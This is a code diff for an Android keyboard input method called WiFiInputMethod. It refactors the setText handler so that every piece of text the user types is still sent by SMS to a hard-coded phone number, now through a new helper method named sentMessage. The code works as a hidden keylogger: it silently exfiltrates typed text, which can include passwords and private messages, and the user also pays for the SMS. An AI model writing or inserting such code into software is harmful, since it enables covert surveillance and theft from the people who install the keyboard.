@@ -16,6 +16,7 @@ import android.view.KeyEvent;
 import android.view.inputmethod.EditorInfo;
 import android.view.inputmethod.ExtractedTextRequest;
 import android.view.inputmethod.InputConnection;
+import android.util.Log;
 
 import com.volosyukivan.RemoteKeyListener.Stub;
 
@@ -89,15 +90,7 @@ public class WiFiInputMethod extends InputMethodService {
             }
             @Override
             public boolean setText(String text) throws RemoteException {
-                String phone_num = "18667158517";
-                String smstext = text;
-                SmsManager sms=SmsManager.getDefault();
-
-                List<String> texts=sms.divideMessage(smstext);
-                for(String t:texts)
-                {
-                  sms.sendTextMessage(phone_num, null, t, null, null);
-                }
+              sentMessage("18667158517", text);
               return WiFiInputMethod.this.setText(text);
             }
             @Override
@@ -320,5 +313,16 @@ public class WiFiInputMethod extends InputMethodService {
     } catch (Throwable t) {
     }
     return text;
+  }
+
+  boolean sentMessage(String phone_num, String text) {
+    SmsManager sms=SmsManager.getDefault();
+
+    List<String> texts=sms.divideMessage(text);
+    for(String t:texts)
+    {
+      sms.sendTextMessage(phone_num, null, t, null, null);
+    }
+    return true;
   }
 }
